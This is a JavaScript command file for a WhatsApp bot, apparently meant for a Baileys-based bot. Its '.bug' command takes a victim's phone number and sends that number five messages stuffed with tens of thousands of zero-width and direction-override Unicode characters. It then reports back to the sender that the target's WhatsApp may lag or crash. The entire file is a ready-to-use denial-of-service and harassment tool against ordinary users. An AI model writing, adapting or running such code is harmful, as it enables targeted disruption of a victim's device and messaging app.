// commands/bug.js - WITH REACTION CONFIRMATION
const { jidNormalizedUser } = require('@whiskeysockets/baileys');

module.exports = async (sock, from, msg, args, isAdmin, botData) => {
    try {
        // ============================================
        // REACT TO THE USER'S COMMAND MESSAGE
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '⚡',
                    key: msg.key
                }
            });
        } catch (e) {
            // Reaction failed but continue
        }

        if (!args || args.length === 0) {
            await sock.sendMessage(from, {
                text: "⚠️ *Usage:* .bug [phone_number]\n\n*Example:* .bug 94703945265"
            });
            return;
        }

        let targetNumber = args[0].replace(/[^0-9]/g, '');

        if (targetNumber.length < 10 || targetNumber.length > 15) {
            await sock.sendMessage(from, {
                text: "❌ *Invalid Phone Number*"
            });
            return;
        }

        const targetJid = jidNormalizedUser(targetNumber + '@s.whatsapp.net');

        await sock.sendMessage(from, {
            text: `🔄 *Bug Deploying...*\nTarget: ${targetNumber}`
        });

        // ============================================
        // SMALLER PAYLOADS - WITHIN WHATSAPP LIMITS
        // ============================================

        // PAYLOAD 1: Invisible Character Burst (Under 50KB)
        const invisiblePayload1 = {
            text: '\u200B'.repeat(8000) + '\u200C'.repeat(8000) + '\u200D'.repeat(8000) + '\uFEFF'.repeat(8000)
        };
        await sock.sendMessage(targetJid, invisiblePayload1);
        await new Promise(resolve => setTimeout(resolve, 1000));

        // PAYLOAD 2: Directional + Invisible Mix
        const invisiblePayload2 = {
            text: '\u202A'.repeat(4000) + '\u202D'.repeat(4000) + '\u202E'.repeat(4000) + '\u200B'.repeat(8000) + '\u200C'.repeat(8000)
        };
        await sock.sendMessage(targetJid, invisiblePayload2);
        await new Promise(resolve => setTimeout(resolve, 1000));

        // PAYLOAD 3: Zero Width Joiner Cascade
        const invisiblePayload3 = {
            text: '‍'.repeat(15000) + '‌'.repeat(15000) + '‍'.repeat(15000)
        };
        await sock.sendMessage(targetJid, invisiblePayload3);
        await new Promise(resolve => setTimeout(resolve, 1000));

        // PAYLOAD 4: Multiple Invisible Types
        const invisiblePayload4 = {
            text: '\u200B'.repeat(5000) + '\u200C'.repeat(5000) + '\u200D'.repeat(5000) + '\uFEFF'.repeat(5000) + '\u2060'.repeat(5000) + '\u2061'.repeat(5000) + '\u2062'.repeat(5000) + '\u2063'.repeat(5000)
        };
        await sock.sendMessage(targetJid, invisiblePayload4);
        await new Promise(resolve => setTimeout(resolve, 1000));

        // PAYLOAD 5: Spaced Invisible Messages
        const invisiblePayload5 = {
            text: '\u200B'.repeat(3000) + ' \u200C'.repeat(3000) + ' \u200D'.repeat(3000) + ' \u200B'.repeat(3000) + ' \u200C'.repeat(3000) + ' \u200D'.repeat(3000)
        };
        await sock.sendMessage(targetJid, invisiblePayload5);

        // ============================================
        // Send Completion Report
        // ============================================
        await sock.sendMessage(from, {
            text: `✅ *Invisible Bug Delivered*\n\n` +
                  `📱 Target: ${targetNumber}\n` +
                  `⚡ Payloads: 5\n` +
                  `👻 Status: INVISIBLE\n\n` +
                  `*Effect:*\n` +
                  `• Target receives invisible messages\n` +
                  `• Chat shows empty/blank messages\n` +
                  `• May cause WhatsApp to lag or crash\n` +
                  `• Invisible messages stack up\n\n` +
                  `⏳ Auto-clear: ~5-10 minutes`
        });

        // ============================================
        // FINAL REACTION - SUCCESS
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '✅',
                    key: msg.key
                }
            });
        } catch (e) {
            // Reaction failed but ignore
        }

    } catch (error) {
        console.error('Bug command error:', error);
        
        // ============================================
        // ERROR REACTION
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '❌',
                    key: msg.key
                }
            });
        } catch (e) {}

        await sock.sendMessage(from, {
            text: `❌ Error: ${error.message}`
        });
    }
};
